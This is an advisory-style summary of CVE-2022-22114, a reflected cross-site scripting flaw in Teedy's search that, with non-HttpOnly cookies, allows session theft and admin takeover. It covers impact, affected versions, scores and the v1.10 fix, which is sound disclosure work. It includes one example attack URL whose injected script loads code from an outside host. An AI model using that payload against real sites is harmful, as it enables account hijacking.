Based on the provided content, here's a breakdown of the vulnerability information for CVE-2022-22114:

**Root cause of vulnerability:**
*   The root cause is insufficient sanitization of the "search term" within the Teedy application's search functionality. Specifically, the search term is not properly neutralized when displayed in search results. This allows for the injection of arbitrary scripts via a URL fragment.

**Weaknesses/vulnerabilities present:**
*   **Reflected Cross-Site Scripting (XSS)**: The application is vulnerable to reflected XSS due to improper handling of user-supplied input in the search field.
*   **Insecure Cookie Handling**: The `HttpOnly` flag is set to "false" on cookies, enabling JavaScript to access them, which is not a best practice.

**Impact of exploitation:**
*   **Arbitrary Script Execution**: An attacker can inject and execute malicious JavaScript code in a victim's browser when the victim accesses a crafted URL.
*   **Session Hijacking/Account Takeover**: Due to the lack of the HttpOnly flag and the ability to execute JavaScript via XSS, an attacker can steal the victim's session ID (cookies) and use it to take over their account. This is especially critical if the victim is a privileged administrator, leading to full administrative account takeover.

**Attack vectors:**
*   **Malicious URL:** The primary attack vector is a specially crafted URL containing malicious JavaScript in the search term parameter within the URL fragment (e.g., `http://vulnerable.teedy.com:8080/#/document/search/%3Cscript~2Fsrc=~2F~2Fxss.tst~2Fx.js%3E%3C~2Fscript%3E`).

**Required attacker capabilities/position:**
*   **Ability to Craft Malicious URLs:** The attacker needs the ability to construct a malicious URL containing the XSS payload.
*   **Social Engineering or Victim Lure:** The attacker needs to trick or lure the victim, especially an administrator, into clicking the malicious URL. The attacker does not require prior authentication to the vulnerable application.

**Additional Details:**
*   The vulnerability is present in Teedy versions v1.5 through v1.9.
*   A proof-of-concept (PoC) is provided, demonstrating how to inject JavaScript and steal cookies by hosting a malicious script (x.js).
*   The vulnerability is related to the lack of sanitization and improper cookie handling.
*   The vulnerability has a CVSS v3.1 base score of 9.6 (Critical) and CVSS v2 base score of 4.3 (Medium).
*   The fix is to upgrade to Teedy v1.10, which should implement the necessary sanitization/escaping for the search term.
